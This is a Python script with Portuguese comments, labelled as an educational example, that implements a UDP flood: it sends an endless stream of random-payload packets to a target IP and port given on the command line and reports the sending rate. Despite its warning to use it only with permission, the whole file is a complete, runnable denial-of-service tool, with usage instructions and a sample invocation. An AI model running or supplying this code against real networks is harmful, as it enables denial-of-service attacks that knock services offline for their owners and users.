#!/usr/bin/env python3

"""
Exemplo de UDP Flood - Apenas para Fins Educacionais

AVISO IMPORTANTE:
Este script é fornecido estritamente para fins educacionais e de demonstração
em ambientes controlados e com permissão explícita.
NÃO o utilize contra sistemas ou redes sem autorização.
A execução não autorizada de ataques DoS/DDoS é ILEGAL e pode resultar
em severas consequências legais e financeiras.
O autor e fornecedor deste script não se responsabilizam por qualquer uso
indevido ou ilegal.

Descrição:
Este script envia um grande volume de pacotes UDP para um endereço IP e porta
alvo, tentando sobrecarregar a rede ou o serviço UDP no host alvo.
Utiliza sockets UDP padrão (SOCK_DGRAM).
Nota: Este script, por padrão, não faz spoofing do IP de origem. Para spoofing,
seriam necessários sockets raw (SOCK_RAW) e privilégios de root, como no
exemplo de Ping Flood.

Dependências:
- Python 3

Como usar (em ambiente controlado e autorizado):
1. Salve este código como 'udp_flood_example.py'.
2. Execute: python3 udp_flood_example.py <ip_alvo> <porta_alvo> [tamanho_pacote]
   - Substitua <ip_alvo> pelo IP do sistema de teste autorizado.
   - Substitua <porta_alvo> pela porta UDP do sistema de teste (ex: 53, 161).
   - [tamanho_pacote] é opcional (padrão 1024 bytes).
"""

import socket
import random
import sys
import time
import os

def main(target_ip, target_port, packet_size=1024):
    print(f"[*] Iniciando UDP Flood para {target_ip}:{target_port}...")
    print(f"[*] Tamanho do pacote: {packet_size} bytes")
    print("[*] Pressione Ctrl+C para parar.")

    try:
        # Cria um socket UDP
        # AF_INET para IPv4, SOCK_DGRAM para UDP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Permite reutilizar o endereço local rapidamente (menos relevante para UDP client)
        # s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error as e:
        print(f"[!] Erro ao criar socket: {e}")
        sys.exit(1)

    # Gera dados aleatórios para o payload
    try:
        payload = os.urandom(packet_size)
    except OverflowError:
        print(f"[!] Erro: Tamanho do pacote ({packet_size}) muito grande.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Erro ao gerar payload: {e}")
        sys.exit(1)

    packet_count = 0
    start_time = time.time()

    try:
        while True:
            try:
                # Envia o pacote UDP para o alvo
                s.sendto(payload, (target_ip, target_port))
                packet_count += 1

                # Imprime status periodicamente para feedback
                if packet_count % 500 == 0:
                    elapsed_time = time.time() - start_time
                    rate = packet_count / elapsed_time if elapsed_time > 0 else 0
                    print(f"[*] Pacotes enviados: {packet_count} | Taxa: {rate:.2f} pps", end='\r')

                # Pequena pausa opcional para controlar a taxa (descomente se necessário)
                # time.sleep(0.0001)

            except socket.gaierror:
                 print(f"\n[!] Erro: Não foi possível resolver o hostname ou IP '{target_ip}'. Verifique o endereço.")
                 break
            except socket.error as send_err:
                # Erros podem ocorrer se a rede ficar indisponível, etc.
                print(f"\n[!] Erro ao enviar pacote: {send_err}")
                time.sleep(0.5) # Pausa antes de tentar novamente
            except Exception as general_err:
                print(f"\n[!] Erro inesperado: {general_err}")
                break

    except KeyboardInterrupt:
        print(f"\n[*] Ataque interrompido pelo usuário.")
    finally:
        elapsed_time = time.time() - start_time
        rate = packet_count / elapsed_time if elapsed_time > 0 else 0
        print(f"[*] Total de pacotes enviados: {packet_count}")
        print(f"[*] Duração: {elapsed_time:.2f} segundos")
        print(f"[*] Taxa média: {rate:.2f} pacotes/segundo")
        # Fecha o socket ao terminar
        if 's' in locals() and s:
            s.close()
            print("[*] Socket fechado.")

if __name__ == "__main__":
    if len(sys.argv) < 3 or len(sys.argv) > 4:
        print("Uso: python3 udp_flood_example.py <ip_alvo> <porta_alvo> [tamanho_pacote]")
        print("Exemplo: python3 udp_flood_example.py 192.168.1.100 53 512")
        sys.exit(1)

    target_ip_address = sys.argv[1]
    try:
        target_port_num = int(sys.argv[2])
        if not 0 < target_port_num <= 65535:
            raise ValueError("Porta fora do intervalo válido (1-65535)")
    except ValueError as e:
        print(f"[!] Erro: Porta inválida - {e}")
        sys.exit(1)

    pkt_size = 1024
    if len(sys.argv) == 4:
        try:
            pkt_size = int(sys.argv[3])
            if pkt_size <= 0 or pkt_size > 65507: # Limite prático UDP IPv4
                 raise ValueError("Tamanho do pacote inválido (1-65507)")
        except ValueError as e:
            print(f"[!] Erro: Tamanho do pacote inválido - {e}")
            sys.exit(1)

    main(target_ip_address, target_port_num, pkt_size)

